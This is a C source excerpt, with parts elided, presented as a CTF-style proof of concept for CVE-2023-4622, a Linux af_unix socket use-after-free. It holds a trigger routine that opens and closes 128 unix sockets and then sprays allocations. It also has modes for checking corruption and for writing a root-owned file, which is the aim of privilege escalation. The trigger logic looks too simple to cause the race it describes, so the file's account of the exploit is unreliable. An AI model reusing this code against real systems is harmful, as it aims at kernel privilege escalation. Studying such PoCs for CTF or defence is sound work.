/*
 * CVE-2023-4622 PoC - CTF Challenge Mode
 *
 * Vulnerability: af_unix socket race condition use-after-free
 *
...
/*
 * AF_UNIX socket Use-After-Free trigger
 *
 * Creates unix stream sockets, triggers garbage collection race
 * that causes UAF on unix_sock structures.
 */
static int trigger_af_unix_uaf(void) {
    int spray_fds[256];
    int saved_errno;

    memset(spray_fds, -1, sizeof(spray_fds));

    /* Step 1: Create many AF_UNIX sockets to pressure GC */
    poc_log("Creating AF_UNIX sockets to trigger GC UAF...");

    int unix_fds[128];
    memset(unix_fds, -1, sizeof(unix_fds));
    
    for (int i = 0; i < 128; i++) {
        unix_fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
        if (unix_fds[i] < 0) continue;
    }

    /* Step 2: Close sockets abruptly to trigger GC */
    for (int i = 0; i < 128; i++) {
        if (unix_fds[i] >= 0) {
            close(unix_fds[i]);
        }
    }
    poc_log("Closed 128 AF_UNIX sockets - GC triggered");

    /* Step 3: Spray to reallocate freed unix_sock */
    int sprayed = 0;
    for (int i = 0; i < 256; i++) {
...
static int mode_uaf(poc_args_t *args) {
    poc_log("Triggering CVE-2023-4622 UAF + spray corruption check...");

    /* Step 1: Trigger UAF condition */
    int uaf_rc = trigger_af_unix_uaf();
    if (uaf_rc < 0) {
        poc_log("UAF trigger failed (unix socket creation error)");
...
static int mode_write_root_file(const poc_args_t *args) {
    ...
    poc_log("Triggering CVE-2023-4622 UAF vulnerability...");
    int spray_count = trigger_af_unix_uaf();
...
int main(int argc, char *argv[]) {
    ...
    poc_log("=== CVE-2023-4622 CTF PoC ===");
    poc_log("Vuln: af_unix socket race condition use-after-free");
